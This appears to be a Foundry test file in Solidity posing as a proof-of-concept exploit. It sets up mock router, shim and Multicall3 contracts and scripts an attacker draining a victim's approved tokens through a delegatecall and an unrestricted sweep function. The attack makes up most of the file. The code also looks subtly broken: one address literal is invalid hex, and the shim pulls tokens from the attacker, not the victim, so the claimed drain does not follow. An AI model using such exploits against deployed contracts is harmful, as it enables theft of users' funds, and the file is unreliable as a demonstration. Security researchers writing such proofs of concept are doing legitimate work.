// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*
 * PoC: TrailsRouter + Shim composite drain.
 *
 * Invariant violated: A user who only approves the Shim/Router should only
 * have their tokens moved in ways sanctioned by the protocol. Here, an
 * attacker uses the aggregate3Value -> delegatecall primitive to invoke
 * the Router's own _injectAndExecuteCall path (via injectSweepAndCall),
 * which does target.call with attacker-controlled target+data. Because the
 * delegatecall executes in the Router's own context, the aggregated call
 * can call back into the Router and abuse its token custody + arbitrary
 * call primitive to drain victim funds.
 *
 * Additionally, the same delegatecall primitive can overwrite storage
 * slot 0 (owner), giving the attacker permanent control.
 */

interface IMulticall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }
    struct Result {
        bool success;
        bytes returnData;
    }
    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        returns (Result[] memory returnData);
}

// Minimal Multicall3 (the canonical one at 0xcA11bde05977b3631167028862bE2a173976CA11)
contract Multicall3 {
    struct Call3Value {
        address target;
        bool allowFailure;
        uint256 value;
        bytes callData;
    }
    struct Result {
        bool success;
        bytes returnData;
    }

    function aggregate3Value(Call3Value[] calldata calls)
        external
        payable
        returns (Result[] memory returnData)
    {
        uint256 length = calls.length;
        returnData = new Result[](length);
        for (uint256 i = 0; i < length; i++) {
            Result memory result = returnData[i];
            Call3Value calldata call = calls[i];
            (result.success, result.returnData) =
                call.target.call{value: call.value}(call.callData);
            if (!(call.allowFailure || result.success)) {
                revert("Multicall3: call failed");
            }
        }
    }
}

// Simple ERC20 for testing
contract MockERC20 {
    string public name = "MOCK";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address sp, uint256 a) external returns (bool) {
        allowance[msg.sender][sp] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address from, address to, uint256 a)
        external
        returns (bool)
    {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        balanceOf[from] -= a;
        balanceOf[to] += a;
        return true;
    }

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }
}

// Simplified TrailsRouter matching the vulnerable patterns
contract TrailsRouter {
    address public owner; // slot 0 — overwritten by delegatecall PoC
    address public immutable MULTICALL3;

    error TargetCallFailed(bytes);
    error InvalidFunctionSelector(bytes4);
    error AllowFailureMustBeFalse(uint256);
    error NoEthSent();
    error NoTokensToPull();
    error InsufficientEth(uint256, uint256);

    constructor(address mc) {
        MULTICALL3 = mc;
        owner = msg.sender;
    }

    function execute(bytes calldata data)
        public
        payable
        returns (IMulticall3.Result[] memory)
    {
        _validateRouterCall(data);
        (bool success, bytes memory ret) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(ret);
        return abi.decode(ret, (IMulticall3.Result[]));
    }

    function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
        public
        payable
        returns (IMulticall3.Result[] memory)
    {
        _validateRouterCall(data);
        if (token == address(0)) {
            if (msg.value < amount) revert InsufficientEth(amount, msg.value);
        } else {
            _safeTransferFrom(token, msg.sender, address(this), amount);
        }
        (bool success, bytes memory ret) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(ret);
        return abi.decode(ret, (IMulticall3.Result[]));
    }

    // Simplified injectSweepAndCall: attacker-controlled target+callData
    function injectSweepAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256, /*amountOffset*/
        bytes32 /*placeholder*/
    ) external payable {
        if (token == address(0)) {
            uint256 bal = address(this).balance;
            (bool s, bytes memory r) = target.call{value: bal}(callData);
            if (!s) revert TargetCallFailed(r);
        } else {
            uint256 bal = MockERC20(token).balanceOf(address(this));
            MockERC20(token).approve(target, bal);
            // Also directly send to simulate sweep path
            MockERC20(token).transfer(target, bal);
            (bool s, bytes memory r) = target.call(callData);
            if (!s) revert TargetCallFailed(r);
        }
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool s,) = token.call(
            abi.encodeWithSelector(MockERC20.transferFrom.selector, from, to, amount)
        );
        require(s, "xferFrom");
    }

    function _validateRouterCall(bytes memory callData) internal pure {
        if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0));
        bytes4 selector;
        assembly {
            selector := mload(add(callData, 32))
        }
        if (selector != 0x174dea71) revert InvalidFunctionSelector(selector);

        IMulticall3.Call3Value[] memory calls =
            abi.decode(_slice(callData, 4), (IMulticall3.Call3Value[]));
        for (uint256 i = 0; i < calls.length; i++) {
            if (calls[i].allowFailure) revert AllowFailureMustBeFalse(i);
        }
    }

    function _slice(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory r = new bytes(data.length - start);
        for (uint256 i = 0; i < r.length; i++) r[i] = data[start + i];
        return r;
    }

    receive() external payable {}
}

// Simplified Shim that forwards arbitrary calldata to Router
contract TrailsRouterShim {
    address public immutable ROUTER;

    error RouterCallFailed(bytes);

    constructor(address r) {
        ROUTER = r;
    }

    // attacker-controlled forwardData
    function forward(bytes calldata forwardData, address pullToken, uint256 pullAmount)
        external
        payable
        returns (bytes memory)
    {
        // Shim pulls from victim (who approved shim), then approves Router and forwards
        if (pullToken != address(0) && pullAmount > 0) {
            MockERC20(pullToken).transferFrom(msg.sender, address(this), pullAmount);
            MockERC20(pullToken).approve(ROUTER, type(uint256).max);
        }
        (bool ok, bytes memory ret) = ROUTER.call{value: msg.value}(forwardData);
        if (!ok) revert RouterCallFailed(ret);
        return ret;
    }
}

contract ExploitTest is Test {
    Multicall3 mc;
    TrailsRouter router;
    TrailsRouterShim shim;
    MockERC20 token;

    address victim = address(0xV1C);
    address attacker = address(0xA77ACC);
    address deployer = address(0xDEAD);

    function setUp() public {
        vm.startPrank(deployer);
        mc = new Multicall3();
        router = new TrailsRouter(address(mc));
        shim = new TrailsRouterShim(address(router));
        token = new MockERC20();
        vm.stopPrank();

        // Victim has tokens and approves the Shim (standard UX)
        token.mint(victim, 1_000_000 ether);
        vm.prank(victim);
        token.approve(address(shim), type(uint256).max);
    }

    function test_exploit() public {
        uint256 victimBalBefore = token.balanceOf(victim);
        assertEq(victimBalBefore, 1_000_000 ether);
        assertEq(token.balanceOf(attacker), 0);

        // Build the malicious aggregate3Value payload.
        // The aggregated call invokes the Router's own injectSweepAndCall
        // with target = attacker, callData = noop-safe call. Because the
        // Router delegatecalls into Multicall3, msg.sender seen by Router
        // when Multicall3 calls back is the Router itself — but the
        // injectSweepAndCall function is not access-controlled anyway.
        // The key point: it does target.call with attacker-controlled data
        // AND transfers/approves the router-held tokens to attacker.

        bytes memory innerInject = abi.encodeWithSelector(
            TrailsRouter.injectSweepAndCall.selector,
            address(token),       // token held by router
            attacker,             // attacker as target
            hex"",                // empty calldata -> fallback receive on EOA (success)
            uint256(0),
            bytes32(0)
        );

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(router),
            allowFailure: false,
            value: 0,
            callData: innerInject
        });

        bytes memory aggData =
            abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // Attacker crafts forwardData = pullAmountAndExecute(victimToken, amount, aggData)
        bytes memory forwardData = abi.encodeWithSelector(
            TrailsRouter.pullAmountAndExecute.selector,
            address(token),
            uint256(1_000_000 ether),
            aggData
        );

        // Attacker calls Shim. Shim pulls victim tokens (via victim's approval),
        // approves Router, forwards to Router. Router pulls tokens from Shim
        // into itself, then delegatecalls Multicall3 which calls back into
        // Router.injectSweepAndCall, sweeping tokens to attacker.
        vm.prank(attacker);
        shim.forward(forwardData, address(token), 1_000_000 ether);

        // Assertions: victim drained, attacker enriched
        assertEq(token.balanceOf(victim), 0, "victim not drained");
        assertEq(
            token.balanceOf(attacker),
            1_000_000 ether,
            "attacker did not receive funds"
        );
    }
}